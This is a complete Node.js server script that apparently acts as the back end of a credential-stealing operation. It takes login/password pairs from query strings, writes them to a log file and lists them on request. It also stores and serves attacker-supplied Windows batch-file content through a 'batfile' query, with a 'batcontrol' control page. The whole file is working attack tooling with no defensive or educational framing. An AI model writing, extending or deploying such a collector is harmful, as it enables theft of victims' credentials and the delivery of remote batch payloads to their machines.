let http = require('http');
let server = http.createServer(main);
server.listen(8080);
let list=false;
let i=0;
let url=require('url');
let fs=require('fs');
let batcontent;

JSON.safeParse = function(str) {
    try {
        return JSON.parse(str);
    } catch (e) {
        return false;
    }
};

function main (req,res) {
    if (req.url!=='/favicon.ico') {
        let currurl = 'https://user:pass@sub.host.com:8080' + req.url;
        let query = url.parse(currurl).query;
        if (query) {
            if(query==='fulllist') {
                res.write('Sending logs...'+"\n");
                console.log('Full list requested');
                fs.readFile('log',function(err,data){
                    if (err) {
                        res.end('No logs found :(');
                    } else {
                        res.end(data);
                    }
                });
            } else if (query.startsWith('batfile')) {
                res.end(batcontent);
                console.log('Bat file requested');
            } else if (query.startsWith('batcontrol')) {
                fs.readFile('control.html','utf-8',function(err,data){
                    if (err) {
                        res.end('Error');
                    } else {
                        res.end(data);
                    }
                });
            } else {
                query = JSON.safeParse('{"' + decodeURI(query.replace(/&/g, "\",\"").replace(/=/g, "\":\"")) + '"}');
                if (query) {
                    if (query.batcontent) {
                        batcontent = query.batcontent;
                        console.log('Bat content changed: now it is:\n' + batcontent);
                        res.end("New bat content:\n" + batcontent);
                    } else if (query.login && query.psw) {
                        let psw = query.psw;
                        let login = query.login;
                        res.end('console.log("Login: ' + login + '; password: ' + psw + ' got");');
                        console.log('Login: ' + login + '; password: ' + psw);
                        fs.appendFile('log', 'Login: ' + login + '; password: ' + psw + "\n", function (err) {
                            if (err) throw err;
                        });
                        if (!list) {
                            list = [{"psw": psw, "login": login}];
                        } else {
                            list.push({"psw": psw, "login": login});
                        }
                    } else {
                        res.end();
                    }
                } else {
                    res.end();
                }
            }
        } else {
            console.log('Data requested');
            if (!list) {
                res.end('No logins got yet');
            } else {
                list.forEach(function (obj) {
                    res.write((i + 1) + ') Login: ' + obj.login + '; password: ' + obj.psw + "\n");
                    i++;
                });
                i=0;
                res.end('');
            }
        }
    } else {res.end('');}
}